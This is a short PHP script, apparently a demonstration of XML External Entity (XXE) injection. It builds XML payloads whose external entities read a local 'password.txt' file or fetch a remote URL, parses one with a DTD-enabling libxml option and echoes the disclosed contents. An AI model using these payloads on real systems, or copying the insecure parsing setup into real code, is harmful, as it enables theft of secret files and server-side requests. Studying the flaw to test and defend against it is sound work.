<?php

$xml = <<<EOS
<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "password.txt" >]><foo>&xxe;</foo>
EOS;

$xml2 = <<<EOS
<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://google.com" >]><foo>&xxe;</foo>
EOS;

$fooElement = simplexml_load_string($xml, SimpleXMLElement::class, LIBXML_DTDVALID);

echo $fooElement;

//$fooElement2 = simplexml_load_string($xml2, SimpleXMLElement::class, LIBXML_DTDVALID);
//echo $fooElement2;
